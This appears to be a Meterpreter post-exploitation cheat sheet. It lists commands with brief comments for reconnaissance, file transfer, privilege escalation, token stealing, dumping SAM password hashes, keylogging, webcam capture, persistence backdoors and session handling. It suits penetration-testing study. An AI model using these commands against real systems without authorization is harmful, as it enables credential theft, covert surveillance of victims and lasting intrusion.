### 📍 Session & System Info

```bash
sysinfo           # Show target system information
getuid            # Display current user identity
ipconfig          # Show network interfaces and IP info
```

### 🕵️‍♂️ Recon & Enumeration

```bash
ps                # List running processes
netstat           # Show active network connections
route             # Display routing table
arp               # Show ARP table
```

### 📂 File System Interaction

```bash
ls                # List directory contents
cd <path>         # Change directory
pwd               # Print working directory
download <file>   # Download file from target
upload <file>     # Upload file to target
rm <file>         # Delete file
mkdir <name>      # Create directory
```

### 🧬 Privilege Escalation & Token Manipulation

```bash
getsystem         # Attempt local privilege escalation
steal_token <pid> # Steal token from specified PID
rev2self          # Revert to original user token
```

### 🔑 Credentials & Memory Access

```bash
hashdump          # Dump password hashes from SAM
```

### 🧑‍💻 User Interaction

```bash
shell             # Spawn a command shell
execute -f <exe>  # Execute a file
keyscan_start     # Start keylogger
keyscan_dump      # Dump captured keystrokes
keyscan_stop      # Stop keylogger
screenshot        # Capture a screenshot
webcam_snap       # Take a snapshot from webcam
webcam_stream     # Stream webcam live
```

### 🧨 Persistence & Backdoors

```bash
persistence -h    # Show persistence module help
run persistence   # Run persistence script
```

### 🔐 Session Management

```bash
background        # Send session to background
sessions -l       # List active sessions
sessions -i <id>  # Interact with a session
```